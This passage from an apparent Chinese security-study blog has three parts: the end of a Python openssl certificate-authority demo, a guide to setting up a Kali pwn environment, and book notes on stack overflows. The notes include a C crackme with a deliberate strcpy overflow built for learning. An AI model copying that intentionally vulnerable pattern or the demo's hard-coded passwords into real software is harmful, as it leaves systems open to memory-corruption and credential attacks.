Client请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Request_Cert</span>(<span class="hljs-params">username, passwd</span>):<br>    <span class="hljs-comment"># 生成私钥</span><br>    command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;genrsa&#x27;</span>, <span class="hljs-string">&#x27;-des3&#x27;</span>, <span class="hljs-string">&#x27;-passout&#x27;</span>, <span class="hljs-string">f&#x27;pass:<span class="hljs-subst">&#123;passwd&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.key&#x27;</span>, <span class="hljs-string">&#x27;2048&#x27;</span>]<br>    subprocess.run(command)<br>    <span class="hljs-comment"># 生成证书请求文件CSR</span><br>    subject_info = <span class="hljs-string">f&quot;/C=CN/ST=Beijing/L=Haidian/O=USTB_<span class="hljs-subst">&#123;username&#125;</span>/OU=USTBer/CN=Client_<span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br>    command2 = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;req&#x27;</span>, <span class="hljs-string">&#x27;-new&#x27;</span>, <span class="hljs-string">&#x27;-key&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.key&#x27;</span>, <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">f&#x27;pass:<span class="hljs-subst">&#123;passwd&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>,<br>                <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.csr&#x27;</span>, <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span>, <span class="hljs-string">&#x27;-subj&#x27;</span>, subject_info]<br>    subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m已连接至CA服务器&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m正在向CA发送签发请求.....&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./<span class="hljs-subst">&#123;username&#125;</span>_req.csr&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mCSR文件发送完成!\n&#x27;</span><br>              <span class="hljs-string">&#x27;\033[32m[+]\033[0m正在等待CA签发......&#x27;</span>)<br><br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m证书<span class="hljs-subst">&#123;username&#125;</span>_req.crt制作完成,可在当前文件夹下查看&#x27;</span>)<br><br><br><span class="hljs-comment"># Client验证证书,若验证通过则在当前文件夹下生成服务端公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Client_Verify</span>():<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看&#x27;</span>)<br>        verify_command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;verify&#x27;</span>, <span class="hljs-string">&#x27;-CAfile&#x27;</span>, <span class="hljs-string">&#x27;./rootCA.crt&#x27;</span>, <span class="hljs-string">f&#x27;Server_req.crt&#x27;</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]服务器证书验证成功!\033[0m&quot;</span>)<br>            gen_server_pk_command = [<span class="hljs-string">&#x27;openssl x509 -in Server_req.crt -pubkey -noout &gt; server_pk.pem&#x27;</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]已经在当前文件夹下生成服务端公钥server_pk.pem!\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]验证失败！！！\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><br><span class="hljs-comment"># Server请求签发证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Request_Cert</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 生成私钥</span><br>        command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;genrsa&#x27;</span>, <span class="hljs-string">&#x27;-des3&#x27;</span>, <span class="hljs-string">&#x27;-passout&#x27;</span>, <span class="hljs-string">f&#x27;pass:USTBServer&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>, <span class="hljs-string">f&#x27;Server_req.key&#x27;</span>, <span class="hljs-string">&#x27;2048&#x27;</span>]<br>        subprocess.run(command, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-comment"># 生成证书请求文件CSR</span><br>        subject_info = <span class="hljs-string">f&quot;/C=CN/ST=Beijing/L=Haidian/O=USTB_Server/OU=Server/CN=USTB_Server&quot;</span><br>        command2 = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;req&#x27;</span>, <span class="hljs-string">&#x27;-new&#x27;</span>, <span class="hljs-string">&#x27;-key&#x27;</span>, <span class="hljs-string">f&#x27;Server_req.key&#x27;</span>, <span class="hljs-string">&#x27;-passin&#x27;</span>, <span class="hljs-string">f&#x27;pass:USTBServer&#x27;</span>, <span class="hljs-string">&#x27;-out&#x27;</span>,<br>                    <span class="hljs-string">f&#x27;Server_req.csr&#x27;</span>, <span class="hljs-string">&#x27;-days&#x27;</span>, <span class="hljs-string">&#x27;365&#x27;</span>, <span class="hljs-string">&#x27;-subj&#x27;</span>, subject_info]<br>        subprocess.run(command2, capture_output=<span class="hljs-literal">True</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mCSR文件生成成功!&#x27;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]私钥生成失败!!!\033[0m&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]查看当前系统是否安装OpenSSL库!!!\033[0m&quot;</span>)<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_port))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m已连接至CA服务器&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0m正在向CA发送签发请求.....&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./Server_req.csr&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = file.read(<span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                client_socket.sendall(data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[32m[+]\033[0mCSR文件发送完成!\n&#x27;</span><br>              <span class="hljs-string">&#x27;\033[32m[+]\033[0m正在等待CA签发......&#x27;</span>)<br><br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;Server_req.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0m证书Server_req.crt制作完成,可在当前文件夹下查看&#x27;</span>)<br><br><span class="hljs-comment"># Server 请求验证客户端证书</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Server_Verify</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> client_socket:<br>        client_socket.connect((CA_host, CA_download_port))<br>        crt_data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data = client_socket.recv(<span class="hljs-number">1024</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br>            crt_data += data<br>        <span class="hljs-comment"># 生成 req.crt 文件</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rootCA.crt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> csr_file:<br>            csr_file.write(crt_data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\033[32m[+]\033[0mrootCA.crt下载完成,请在当前目录下查看&#x27;</span>)<br>        verify_command = [<span class="hljs-string">&#x27;openssl&#x27;</span>, <span class="hljs-string">&#x27;verify&#x27;</span>, <span class="hljs-string">&#x27;-CAfile&#x27;</span>, <span class="hljs-string">&#x27;./rootCA.crt&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;username&#125;</span>_req.crt&#x27;</span>]<br>        result = subprocess.run(verify_command, capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> result.stdout.strip():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]目标客户端证书验证成功!\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[31m[-]验证失败！！！\033[0m&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CA</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\033[34m _   _ ____ _____ ____     ____    _    \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m| | | / ___|_   _| __ )   / ___|  / \   \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m| | | \___ \ | | |  _ \  | |     / _ \  \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m| |_| |___) || | | |_) | | |___ / ___ \ \033[0m\n&#x27;</span><br>          <span class="hljs-string">&#x27;\033[34m\___/ |____/ |_| |____/___\____/_/   \_\ \033[0m\n&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t\t\t\t\033[34m-------created by 3xsh0re\033[0m&quot;</span>)<br>    root_ca_file = Path(<span class="hljs-string">&quot;rootCA.crt&quot;</span>)<br>    <span class="hljs-keyword">if</span> root_ca_file.is_file():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[32m[+]rootCA.crt已经生成\033[0m&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 生成根证书</span><br>        Gen_rootCA()<br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> executor:<br>        <span class="hljs-comment"># 提交线程1的执行</span><br>        thread1 = executor.submit(Download_rootCA)<br>        <span class="hljs-comment"># 提交线程2的执行</span><br>        thread2 = executor.submit(Sign_Cert)<br>        <span class="hljs-comment"># 等待两个线程执行完成</span><br>        concurrent.futures.wait([thread1, thread2])<br><br><br><span class="hljs-comment"># Client端请求CA颁发证书</span><br>Client_Request_Cert(<span class="hljs-string">&quot;3xsh0re&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>)<br><span class="hljs-comment"># 用户验证Server</span><br><span class="hljs-comment"># Client_Verify()</span><br><br><span class="hljs-comment"># Server端请求CA颁发证书</span><br><span class="hljs-comment"># Server_Request_Cert()</span><br><span class="hljs-comment"># Server验证用户ZZR</span><br>Server_Verify(<span class="hljs-string">&quot;3xsh0re&quot;</span>)<br><br><span class="hljs-comment"># CA端</span><br><span class="hljs-comment"># CA()</span><br></code></pre></td></tr></table></figure><p>下面是笔者和几个小伙伴用数字认证原理改造的一个Python聊天室项目</p><p><a href="https://github.com/REMIXXYH/ChatRoom">基于CA和SSL改造的ChatRoom</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数字认证技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Kali下快速配置一个pwn环境</title>
    <link href="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/"/>
    <url>/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h2 id="在Kali下快速配置一个简单的PWN环境"><a href="#在Kali下快速配置一个简单的PWN环境" class="headerlink" title="在Kali下快速配置一个简单的PWN环境"></a>在Kali下快速配置一个简单的PWN环境</h2><p>多次搭建了，但是忘性太大了每次都去搜索，感觉很慢，所以就自己写一个集中一点🤣</p><span id="more"></span><h3 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h3><p>官网下载实在是太慢了，所以我选择百度网盘，因为我是会员😎</p><p>这里贴上我的网盘链接：<a href="https://pan.baidu.com/s/1UP7BzYkHBv54v3_bZjWmxQ">Kali-Liunx-2023.3-VM</a></p><p>提取码：xiyq</p><p>然后VM里打开就OK了，然后就入，默认账密：kali&#x2F;kali</p><h3 id="root-换源"><a href="#root-换源" class="headerlink" title="root&amp;&amp;换源"></a>root&amp;&amp;换源</h3><h4 id="root"><a href="#root" class="headerlink" title="root"></a>root</h4><p>进去之后当然不是root权限，当然不爽啦吗，右键打开终端，然后输入kali的密码kali，切换到root用户，修改root用户密码，然后重启以root身份登入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">su root<br>passwd<br>reboot<br></code></pre></td></tr></table></figure><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><p>然后就是换源，一个是apt源，一个是pip源</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sh">//换apt源<br>vim /etc/apt/sources.list<br>//deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<br>apt-get update<br>apt-get upgrade<br>//换pip源<br><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">mkdir</span> .pip<br><span class="hljs-built_in">cd</span> .pip<br>vim pip.conf<br>/*<br>[global]<br><span class="hljs-built_in">timeout</span> = 6000<br>index-url = https://pypi.tuna.tsinghua.edu.cn/simple/<br>[install]<br>trusted-host=https://pypi.tuna.tsinghua.edu.cn<br>*/<br></code></pre></td></tr></table></figure><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_22-00-47.png"></p><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_22-01-46.png"></p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>安装pwntools，在本kali下是python3了，所以其实是安装pwn库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install pwn<br></code></pre></td></tr></table></figure><p>没啥问题</p><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_21-58-31.png"></p><h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><p>安装pwndbg，pwndbg其实是原生gdb的一个插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">mkdir</span> pwn<br><span class="hljs-built_in">cd</span> pwn<br>git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>./setup.sh<br>gdb<br></code></pre></td></tr></table></figure><p>安装完即可！😀</p><p><img src="/2023/12/03/%E5%9C%A8Kali%E4%B8%8B%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AE%E4%B8%80%E4%B8%AApwn%E7%8E%AF%E5%A2%83/Snipaste_2023-12-03_22-00-12.png"></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件与系统安全</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔2</title>
    <link href="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/"/>
    <url>/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔2"><a href="#0Day安全软件漏洞分析第2版阅读随笔2" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔2"></a>0Day安全软件漏洞分析第2版阅读随笔2</h1><p>开启第二章的阅读，栈溢出基本原理！</p><p>程序中所使用的缓冲区可以是堆区、栈区和存放静态变量的数据区。本章主要介绍在系统栈中发生溢出的情形。</p><p>Impossible-&gt;I’m possible😎</p><span id="more"></span><h2 id="第二章-栈溢出原理与实践"><a href="#第二章-栈溢出原理与实践" class="headerlink" title="第二章-栈溢出原理与实践"></a>第二章-栈溢出原理与实践</h2><h3 id="系统栈的工作原理"><a href="#系统栈的工作原理" class="headerlink" title="系统栈的工作原理"></a>系统栈的工作原理</h3><h4 id="操作系统的内存"><a href="#操作系统的内存" class="headerlink" title="操作系统的内存"></a>操作系统的内存</h4><p>进程使用内存可以按照功能可以非常简单地分为以下4个部分（实际上的内存远没有这么简单）：</p><ul><li><p>代码区：<strong>存放二进制机器码</strong>，CPU在此处取指并执行。PE文件的代码段中包含的二进制机器码会被装入内存的代码区（.text）</p></li><li><p>数据区：存放<strong>全局变量</strong></p></li><li><p>堆区：进程可以在堆区动态地请求一定大小的内存，用完后还给堆区。<strong>动态分配和回收是堆区的特点</strong>。</p></li><li><p>栈区：用于动态存储函数之间的调用关系，以保证被调函数在返回时恢复到母函数中继续执行。</p></li></ul><h4 id="系统栈、函数栈帧"><a href="#系统栈、函数栈帧" class="headerlink" title="系统栈、函数栈帧"></a>系统栈、函数栈帧</h4><p>​首先栈是一种数据结构，这个肯定都知道啦🤣两种操作，PUSH和POP，存在栈顶TOP和栈底BASE，一般来说，TOP是动态的，BASE是静态的。</p><p>​内存中的栈区实际上就是系统栈，是系统实现的一种管理函数调用的数据结构，由系统自动维护。</p><p>​不同的操作系统在函数调用的规定上是不同的，如果要明确使用某一种调用约定，需要在函数前加上调用约定的声明。默认情况下，采用<code>_stdcall</code>这种方式。</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_10-13-07.png"></p><p>​而函数的调用就是通过系统栈的来实现的，当一个新的函数被调用时，会为其开辟一个新的栈帧，OS会进行以下操作：</p><ol><li>按规定顺序压入函数参数</li><li>压入返回地址，一般为函数调用指令的地址</li><li>此时CPU开始读取新的代码区的指令</li><li>压入当前栈帧的栈底指针值（EBP）</li><li>EBP&lt;&#x3D;ESP，此时EBP指向的内存位置存储的是源函数的栈底指针值</li><li>ESP&#x3D;ESP-所需空间</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">PUSH arg3;<br>PUSH arg2;<br>PUSH arg1;<br>CALL func; //此时压入返回地址，代码区转换<br>PUSH EBP;<br>MOV  EBP,ESP;<br>SUB  ESP,EBX;//假设EBX为需要的内存大小,静态变量使用内存大小的确定在编译器编译时就已经确定了<br></code></pre></td></tr></table></figure><p>当函数调用完成时，</p><ol><li>返回值存放在EAX寄存器</li><li>ESP&#x3D;ESP+占用内存大小</li><li>EBP&#x3D;(EBP)</li><li>函数返回值addr弹回，EIP&#x3D;addr</li></ol><p>汇编伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ADD  ESP,EBX;<br>MOV  EBP,(EBP);<br>POP  EBP;<br>RETN; <br></code></pre></td></tr></table></figure><p><a href="https://gitbook.coder.cat/function-call-principle/content/storage-of-local-variables.html">关于局部变量的存储</a>，这里书里没有讲，寄存器和内存都可以用来存放<code>函数执行时</code>所需的<code>数据</code>。寄存器的存取速度比内存快很多，所以通常会优先把数据存入寄存器中。但是由于寄存器数量有限，因此当寄存器不够用时会将数据存放在栈内存中。</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-10-30_11-14-28.png"></p><h3 id="修改临界变量"><a href="#修改临界变量" class="headerlink" title="修改临界变量"></a>修改临界变量</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在系统栈中存在某一种可能的情况，局部变量紧挨着排列，当局部变量中存在数组之类的缓冲区时，并且在赋值时数组可以发生越界，那么越界的数组元素可能破坏相邻变量的值，甚至当紧挨着<code>EBP</code>时，从而修改<code>EBP</code>、返回地址等等。</p><h4 id="crack-me2"><a href="#crack-me2" class="headerlink" title="crack_me2"></a>crack_me2</h4><p>人为制造溢出：</p><p>注意<code>buffer</code>的声明位置</p><p>我们的目标是溢出到返回值，让其返回1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;3xsh0re&quot;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG     <span class="hljs-string">&quot;flag&#123;stack_overflow_right?&#125;&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">8</span>];<span class="hljs-comment">// add local buffto be overflowed </span><br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-built_in">strcpy</span>(buffer,password);<span class="hljs-comment">//over flowed here! </span><br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input password: &quot;</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n\n&quot;</span>); <br>        &#125; <br>   <span class="hljs-keyword">else</span> <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have got the flag:%s\n&quot;</span>,FLAG); <br>            <span class="hljs-keyword">break</span>; <br>        &#125; <br>    &#125; <br>&#125; 